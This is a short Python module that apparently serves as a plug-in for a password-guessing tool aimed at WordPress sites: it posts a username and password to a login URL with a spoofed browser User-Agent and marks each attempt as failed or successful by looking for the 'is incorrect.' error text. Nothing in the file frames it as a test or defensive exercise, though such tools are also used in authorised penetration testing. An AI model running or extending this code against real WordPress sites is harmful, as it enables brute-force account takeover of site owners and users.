import requests
import bs4
from main_handler import main, Attempt

class WordPressLogin():
    def __init__(self, login_url, csrf_url):
        self.session = requests.Session()
        self.login_url = login_url

        #By default Wordpress does not have CSRF proctection on the login.
        if not csrf_url:
            self.csrf_url = login_url
        else:
            self.csrf_url = csrf_url

    def login(self, username, password):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.4086.0 Safari/537.36",
            "Referer": self.csrf_url
        }

        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log+In",
        }

        response = self.session.post(self.login_url, headers=headers, data=data)

        bad_patterns = [
                "is incorrect."
        ]

        for pattern in bad_patterns:
            if pattern in response.text:
                return Attempt.Failed

        return Attempt.Success

if __name__ == '__main__':
    main(WordPressLogin)
